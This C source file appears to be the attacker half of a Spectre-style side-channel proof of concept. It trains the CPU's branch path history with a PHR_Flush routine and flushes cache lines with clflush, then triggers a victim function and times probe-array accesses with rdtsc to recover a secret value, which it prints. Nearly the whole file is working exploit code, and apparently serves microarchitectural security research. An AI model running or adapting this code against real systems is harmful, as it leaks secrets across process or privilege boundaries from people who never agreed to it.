#include "Attacker.h"
#include "Victim.h"
#include <x86intrin.h>
#include <stdio.h>
#include <time.h>

unsigned char attacker_array[BYTE_MAX*Cache_Line];
int randa[BYTE_MAX];
// unsigned long long difference[BYTE_MAX];
int len_array[BYTE_MAX*Cache_Line];
int times[BYTE_MAX];
char mark[BYTE_MAX];

#define flush(ptr) \
    asm volatile( \
        "clflush (%0)\n"\
        : \
        : "c" (ptr) \
    )

#define min(x, y) (x) < (y) ? (x) : (y)

int PHR_Flush(int length, int callLen) {
    int i;
    volatile int temp = 3;
    asm("nop; nop; nop;\n\t");
    for(i = 0; i < PHR_LEN+1; i++) {
        // int k = rand();
        // if (k & 1)
        //     i += (i+1)/(i+1)-1;
        // if ((k >> 1) & 1)
        //     i += (i+1)/(i+1)-1;
        // if ((k >> 2) & 1)
        //     i += (i+1)/(i+1)-1;
        // if ((k >> 3) & 1)
            i += (i+1)/(i+1)-1;
    }
    asm volatile("mfence");
    
    temp+=func(callLen);
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    asm volatile("mfence");
    temp += (temp+1)/(temp+1)-1;
    i = -1;
    do {
        ++i;
    } while(i < len_array[i*Cache_Line]);
    // for(i = 0; i < len_array[i*Cache_Line]; i++) {
        // temp++;

        // asm volatile("mfence");
        // printf("%d ", i);
    // }
    // puts("");
    temp += attacker_array[i * Cache_Line];
    return temp;
}

int main(int argc, char* argv[]) {
    unsigned long long start, end;
    unsigned char temp;
    int gened[BYTE_MAX];
    int secret;
    volatile int tmp = 0;

    int reverse, offset=0;
    if (argc <= 2)
        reverse = 0;
    else reverse = atoi(argv[2]);
    if (argc >= 2)
        secret = atoi(argv[1]);
    else secret = 15;
    if (argc >= 4)
        offset = atoi(argv[3]);
    else offset = 0;
    // printf("secret is %d\n", secret);
    // puts("-----------------split line-----------------");
    srand(time(NULL));
    for (int i = 0; i < BYTE_MAX; i++) gened[i] = 0;
    for (int i = 0; i < BYTE_MAX; i++) {
        int r = rand() % BYTE_MAX;
        while(gened[r])
            r = rand() % BYTE_MAX;
        gened[r] = 1;
        randa[i] = r;
    }

    for(int i = 0; i < BYTE_MAX; i++) {
        attacker_array[i*Cache_Line] = randa[i];
        // difference[i] = 99999;
        len_array[i*Cache_Line] = PHR_LEN+10;
    }
    usleep(15000);
    for (int k = 0; k < ATK_ROUNDS; k++) {
    // train S(0, 0, PHR_LEN) ~ S(0, PHR_LEN, 0)
        for (int i = 0; i < PHR_LEN-offset; i++) {
            int t = reverse ? PHR_LEN-offset-i-1 : i;
            // if (reverse)
            len_array[t*Cache_Line] = t;
            // else len_array[i*Cache_Line] = i;
            for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
                tmp+=PHR_Flush(t, PHR_LEN-offset-1-t);
                // if (reverse)
                    // tmp+=PHR_Flush(PHR_LEN-offset-i-1, i);
                // else tmp+=PHR_Flush(i, PHR_LEN-offset-i-1);
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                asm volatile("mfence");
            }
            // if (reverse)
                // len_array[(PHR_LEN-offset-i-1)*Cache_Line] = PHR_LEN+10;
            // else    
            len_array[t*Cache_Line] = PHR_LEN+10;
        }

        // attacker retrieve
        flush(attacker_array+0*Cache_Line); flush(len_array+0*Cache_Line);
        flush(attacker_array+1*Cache_Line); flush(len_array+1*Cache_Line);
        flush(attacker_array+2*Cache_Line); flush(len_array+2*Cache_Line);
        flush(attacker_array+3*Cache_Line); flush(len_array+3*Cache_Line);
        flush(attacker_array+4*Cache_Line); flush(len_array+4*Cache_Line);
        flush(attacker_array+5*Cache_Line); flush(len_array+5*Cache_Line);
        flush(attacker_array+6*Cache_Line); flush(len_array+6*Cache_Line);
        flush(attacker_array+7*Cache_Line); flush(len_array+7*Cache_Line);
        flush(attacker_array+8*Cache_Line); flush(len_array+8*Cache_Line);
        flush(attacker_array+9*Cache_Line); flush(len_array+9*Cache_Line);
        flush(attacker_array+10*Cache_Line); flush(len_array+10*Cache_Line);
        flush(attacker_array+11*Cache_Line); flush(len_array+11*Cache_Line);
        flush(attacker_array+12*Cache_Line); flush(len_array+12*Cache_Line);
        flush(attacker_array+13*Cache_Line); flush(len_array+13*Cache_Line);
        flush(attacker_array+14*Cache_Line); flush(len_array+14*Cache_Line);
        flush(attacker_array+15*Cache_Line); flush(len_array+15*Cache_Line);
        flush(attacker_array+16*Cache_Line); flush(len_array+16*Cache_Line);
        flush(attacker_array+17*Cache_Line); flush(len_array+17*Cache_Line);
        flush(attacker_array+18*Cache_Line); flush(len_array+18*Cache_Line);
        flush(attacker_array+19*Cache_Line); flush(len_array+19*Cache_Line);
        flush(attacker_array+20*Cache_Line); flush(len_array+20*Cache_Line);
        flush(attacker_array+21*Cache_Line); flush(len_array+21*Cache_Line);
        flush(attacker_array+22*Cache_Line); flush(len_array+22*Cache_Line);
        flush(attacker_array+23*Cache_Line); flush(len_array+23*Cache_Line);
        flush(attacker_array+24*Cache_Line); flush(len_array+24*Cache_Line);
        flush(attacker_array+25*Cache_Line); flush(len_array+25*Cache_Line);
        flush(attacker_array+26*Cache_Line); flush(len_array+26*Cache_Line);
        flush(attacker_array+27*Cache_Line); flush(len_array+27*Cache_Line);
        flush(attacker_array+28*Cache_Line); flush(len_array+28*Cache_Line);
        flush(attacker_array+29*Cache_Line); flush(len_array+29*Cache_Line);
        flush(attacker_array+30*Cache_Line); flush(len_array+30*Cache_Line);
        flush(attacker_array+31*Cache_Line); flush(len_array+31*Cache_Line);
        flush(attacker_array+32*Cache_Line); flush(len_array+32*Cache_Line);
        flush(attacker_array+33*Cache_Line); flush(len_array+33*Cache_Line);
        flush(attacker_array+34*Cache_Line); flush(len_array+34*Cache_Line);
        flush(attacker_array+35*Cache_Line); flush(len_array+35*Cache_Line);
        flush(attacker_array+36*Cache_Line); flush(len_array+36*Cache_Line);
        flush(attacker_array+37*Cache_Line); flush(len_array+37*Cache_Line);
        flush(attacker_array+38*Cache_Line); flush(len_array+38*Cache_Line);
        flush(attacker_array+39*Cache_Line); flush(len_array+39*Cache_Line);
        flush(attacker_array+40*Cache_Line); flush(len_array+40*Cache_Line);
        flush(attacker_array+41*Cache_Line); flush(len_array+41*Cache_Line);
        flush(attacker_array+42*Cache_Line); flush(len_array+42*Cache_Line);
        flush(attacker_array+43*Cache_Line); flush(len_array+43*Cache_Line);
        flush(attacker_array+44*Cache_Line); flush(len_array+44*Cache_Line);
        flush(attacker_array+45*Cache_Line); flush(len_array+45*Cache_Line);
        flush(attacker_array+46*Cache_Line); flush(len_array+46*Cache_Line);
        flush(attacker_array+47*Cache_Line); flush(len_array+47*Cache_Line);
        flush(attacker_array+48*Cache_Line); flush(len_array+48*Cache_Line);
        flush(attacker_array+49*Cache_Line); flush(len_array+49*Cache_Line);
        flush(attacker_array+50*Cache_Line); flush(len_array+50*Cache_Line);
        flush(attacker_array+51*Cache_Line); flush(len_array+51*Cache_Line);
        flush(attacker_array+52*Cache_Line); flush(len_array+52*Cache_Line);
        flush(attacker_array+53*Cache_Line); flush(len_array+53*Cache_Line);
        flush(attacker_array+54*Cache_Line); flush(len_array+54*Cache_Line);
        flush(attacker_array+55*Cache_Line); flush(len_array+55*Cache_Line);
        flush(attacker_array+56*Cache_Line); flush(len_array+56*Cache_Line);
        flush(attacker_array+57*Cache_Line); flush(len_array+57*Cache_Line);
        flush(attacker_array+58*Cache_Line); flush(len_array+58*Cache_Line);
        flush(attacker_array+59*Cache_Line); flush(len_array+59*Cache_Line);
        flush(attacker_array+60*Cache_Line); flush(len_array+60*Cache_Line);
        flush(attacker_array+61*Cache_Line); flush(len_array+61*Cache_Line);
        flush(attacker_array+62*Cache_Line); flush(len_array+62*Cache_Line);
        flush(attacker_array+63*Cache_Line); flush(len_array+63*Cache_Line);
        flush(attacker_array+64*Cache_Line); flush(len_array+64*Cache_Line);
        flush(attacker_array+65*Cache_Line); flush(len_array+65*Cache_Line);
        flush(attacker_array+66*Cache_Line); flush(len_array+66*Cache_Line);
        flush(attacker_array+67*Cache_Line); flush(len_array+67*Cache_Line);
        flush(attacker_array+68*Cache_Line); flush(len_array+68*Cache_Line);
        flush(attacker_array+69*Cache_Line); flush(len_array+69*Cache_Line);
        flush(attacker_array+70*Cache_Line); flush(len_array+70*Cache_Line);
        flush(attacker_array+71*Cache_Line); flush(len_array+71*Cache_Line);
        flush(attacker_array+72*Cache_Line); flush(len_array+72*Cache_Line);
        flush(attacker_array+73*Cache_Line); flush(len_array+73*Cache_Line);
        flush(attacker_array+74*Cache_Line); flush(len_array+74*Cache_Line);
        flush(attacker_array+75*Cache_Line); flush(len_array+75*Cache_Line);
        flush(attacker_array+76*Cache_Line); flush(len_array+76*Cache_Line);
        flush(attacker_array+77*Cache_Line); flush(len_array+77*Cache_Line);
        flush(attacker_array+78*Cache_Line); flush(len_array+78*Cache_Line);
        flush(attacker_array+79*Cache_Line); flush(len_array+79*Cache_Line);
        flush(attacker_array+80*Cache_Line); flush(len_array+80*Cache_Line);
        flush(attacker_array+81*Cache_Line); flush(len_array+81*Cache_Line);
        flush(attacker_array+82*Cache_Line); flush(len_array+82*Cache_Line);
        flush(attacker_array+83*Cache_Line); flush(len_array+83*Cache_Line);
        flush(attacker_array+84*Cache_Line); flush(len_array+84*Cache_Line);
        flush(attacker_array+85*Cache_Line); flush(len_array+85*Cache_Line);
        flush(attacker_array+86*Cache_Line); flush(len_array+86*Cache_Line);
        flush(attacker_array+87*Cache_Line); flush(len_array+87*Cache_Line);
        flush(attacker_array+88*Cache_Line); flush(len_array+88*Cache_Line);
        flush(attacker_array+89*Cache_Line); flush(len_array+89*Cache_Line);
        flush(attacker_array+90*Cache_Line); flush(len_array+90*Cache_Line);
        flush(attacker_array+91*Cache_Line); flush(len_array+91*Cache_Line);
        flush(attacker_array+92*Cache_Line); flush(len_array+92*Cache_Line);
        // trigger victim
        // volatile int length = BYTE_MAX-1;
        // flush(&length);
        tmp+=PHR_Flush(PHR_LEN+10, secret);
        unsigned int tsc_aux;
        // for (int i = 0; i < BYTE_MAX; i++) gened[i] = 0;
        // for (int i = 0; i < BYTE_MAX; i++) {
        //     int r = rand() % BYTE_MAX;
        //     while(gened[r])
        //         r = rand() % BYTE_MAX;
        //     gened[r] = 1;
        //     randa[i] = r;
        // }
        for (int i = 0; i < BYTE_MAX; i++) {
            // unsigned char* temp_addr = ;
            // int idx = randa[(i-k+BYTE_MAX)%BYTE_MAX];
            int idx = randa[(i+k)%BYTE_MAX];
            asm volatile("mfence");
            start = __rdtsc();
            temp = *(unsigned char*)(attacker_array+idx*Cache_Line);
            end = __rdtscp(&tsc_aux);
            asm volatile("lfence");
            // asm volatile("mfence");

            // difference[randa[i]] = end-start;
            times[idx] += (end-start) <= HIT_THRESHOLD;
            // printf("%llu ", end-start);
            // difference[randa[i]] = min(end-start, difference[randa[i]]);
            // printf("Spectre Attacking ...\n\n");
        }
    }
    // printf("tmp: %d temp: %d\n", tmp, temp);
    for(int i = 0; i < PHR_LEN-offset; i++) {
        // printf("%d ", times[i]);
        mark[i] = times[i] >= TIMES_THRESHOLD;
    }
    // puts("");
    int s = 0, e = PHR_LEN;
    int MAX_OUTPUT_LINES=1;
    int out_times = 0;
    for(int i = s; i < e-offset; i++)
        if(mark[i]) {
            int ss=PHR_LEN-offset-i-1;
            printf("confidence [%d] hit at: %d, means secret equals %d-%d-%d-1 = %d\n", times[i], i, PHR_LEN, i, offset, ss);
            if (++out_times >= MAX_OUTPUT_LINES) break;
        }
    // puts("");
}